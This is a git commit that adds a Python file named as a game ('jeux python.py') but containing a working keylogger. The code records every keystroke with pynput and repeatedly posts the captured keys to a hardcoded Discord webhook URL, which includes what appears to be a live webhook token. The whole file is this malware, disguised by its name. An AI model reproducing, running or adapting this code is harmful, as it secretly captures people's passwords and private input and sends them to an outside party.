66cb007f85f8946ddf21ec600fed62cc8aaf5742
juto222 <thomasjulien3101@gmail.com>
2024-12-03 16:50:11 +0100

    Create jeux python.py

---
+++ jeux python.py
@@ -0,0 +1,40 @@
+from pynput import keyboard
+import requests
+
+touche = []
+
+def jsp(key):
+    try:
+        touche.append(key.char)  
+    except AttributeError:
+        touche.append(str(key))  
+
+#modifier l'url du webhooks du discord
+
+def envoyer():
+    url = 'https://discord.com/api/webhooks/1313189869115146362/rMgHilGBElyfkREieC_JttqZDPElfi8FxzHuY9PSC3c58Mk-HdwTgJJXPRxEVGx5FEAy'
+    keylog = {
+        "content": " TOUCHE ENVOYE :       ".join(touche)  
+    }
+    try:
+        response = requests.post(url, json=keylog)
+        if response.status_code == 204:
+            print("Données envoyées avec succès !")
+        else:
+            print(f"Erreur : {response.status_code}")
+    except Exception as e:
+        print(f"Erreur lors de l'envoi : {e}")
+
+def keylogger():
+    listener = keyboard.Listener(on_press=jsp)
+    listener.start()
+
+    try:
+        while True:  
+            if len(touche) >= 1:  
+                envoyer()
+                touche.clear()
+    except KeyboardInterrupt:
+        print("Keylogger arrêté.")
+
+keylogger()
